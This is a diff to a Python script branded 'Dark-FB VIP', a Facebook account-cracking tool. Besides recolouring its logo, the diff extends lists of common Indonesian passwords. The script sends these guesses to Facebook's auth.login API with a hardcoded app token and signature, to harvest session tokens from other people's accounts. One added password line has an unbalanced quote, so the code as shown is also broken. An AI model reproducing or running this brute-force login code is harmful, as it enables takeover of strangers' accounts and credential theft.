@@ -36,19 +36,19 @@ def jalan(z):
 	
 		
 ##### LOGO #####
-logo = """\033[1;97m█████████
-\033[1;97m█▄█████▄█      \033[1;96m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
-\033[1;97m█\033[1;91m▼▼▼▼▼ \033[1;97m- _ --_--\033[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
-\033[1;97m█ \033[1;97m \033[1;97m_-_-- -_ --__\033[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
-\033[1;97m█\033[1;91m▲▲▲▲▲\033[1;97m--  - _ --\033[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;93mVIP
-\033[1;97m█████████      \033[1;96m«°°°°°°°°°°✧°°°°°°°°°°»
-\033[1;97m ██ ██
-\033[1;97m╔════════════════════════════════════════╗
-\033[1;97m║\033[1;93m* \033[1;97mRecode  \033[1;91m: \033[1;96mThe Magizz \033[1;97m                 ║
-\033[1;97m║\033[1;93m* \033[1;97mGithub  \033[1;91m: \033[1;96mhttps://github.com/TheMagizz\033[1;97m║
-\033[1;97m║\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;92m\033[4mhttps://fb.me/rizz.magizz\033[0m   \033[1;97m║
-\033[1;97m║\033[1;93m* \033[1;97mVersion \033[1;91m: \033[1;92m\033[4m1.0.0\033[0m                       \033[1;97m║
-\033[1;97m╚════════════════════════════════════════╝"""
+logo = """\033[1;91m█████████
+\033[1;91m█▄█████▄█      \033[1;96m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
+\033[1;91m█\033[1;97m▼▼▼▼▼ \033[1;97m- _ --_--\033[1;92m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗ 
+\033[1;91m█ \033[1;97m \033[1;97m_-_-- -_ --__\033[1;92m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
+\033[1;91m█\033[1;91m▲▲▲▲▲\033[1;97m--  - _ --\033[1;92m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;93mVIP
+\033[1;91m█████████      \033[1;96m«°°°°°°°°°°✧°°°°°°°°°°»
+\033[1;91m ██ ██
+\033[1;93m╔════════════════════════════════════════╗
+\033[1;93m║\033[1;93m* \033[1;97mRecode  \033[1;91m: \033[1;96mThe Magizz \033[1;97m                 ║
+\033[1;93m║\033[1;93m* \033[1;97mGithub  \033[1;91m: \033[1;96mhttps://github.com/TheMagizz\033[1;97m║
+\033[1;93m║\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;92m\033[4mhttps://fb.me/rizz.magizz\033[0m   \033[1;97m║
+\033[1;93m║\033[1;93m* \033[1;97mVersion \033[1;91m: \033[1;92m\033[4m1.0.0\033[0m                       \033[1;97m║
+\033[1;93m╚════════════════════════════════════════╝"""
 
 # titik #
 def tik():
@@ -1401,7 +1401,7 @@ def pilih_super():
 													cekpoint.append(user+pass5)
 												else:
 													#Pass6
-													pass6 = "bintang123", " bintang12345"
+													pass6 = "bintang123, "bintang12345"
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -1419,7 +1419,7 @@ def pilih_super():
 															#Pass7
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = "sayang", "doraemon", "bintang", "someone", "bajingan", "anjing", "pukimak", "playboy"
+															pass7 = "sayang", "doraemon", "bintang", "someone", "bajingan", "anjing", "pukimak", "playboy", "zeyenk", "sayank", "asu123", "asw123", "goblok", "anjink", "naruto",
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
